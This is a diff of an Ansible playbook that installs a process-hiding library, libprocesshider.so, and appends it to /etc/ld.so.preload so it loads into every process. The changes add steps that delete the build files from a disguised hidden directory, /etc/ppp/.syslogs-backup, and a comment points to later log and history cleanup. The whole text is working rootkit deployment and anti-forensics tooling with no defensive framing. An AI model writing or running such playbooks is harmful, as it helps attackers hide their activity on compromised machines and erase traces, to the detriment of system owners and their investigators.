@@ -119,12 +119,30 @@
       args:
         chdir: "{{ deploy_dir }}"
 
-    - name: Move compiled .so and update /etc/ld.so.preload
-      shell: mv {{ deploy_dir }}/libprocesshider.so /usr/local/lib/
+    - name: Move libprocesshider.so to /usr/local/lib
+      copy:
+        src: "{{ deploy_dir }}/libprocesshider.so"
+        dest: /usr/local/lib/libprocesshider.so
+        remote_src: yes
+        mode: "0755"
     
     - name: echo to preload
       shell: echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload > /dev/null
 
+# Cleanup
+    - name: Delete previous created process.so
+      file:
+        path: /etc/ppp/.syslogs-backup/libprocesshider.so
+        state: absent
+
+    - name: Delete previous created process.so
+      file:
+        path: /etc/ppp/.syslogs-backup/libprocesshider.c
+        state: absent
+    - name: Delete previous created process.so
+      file:
+        path: /etc/ppp/.syslogs-backup/Makefile
+        state: absent
 
     
     # Log and history cleanup
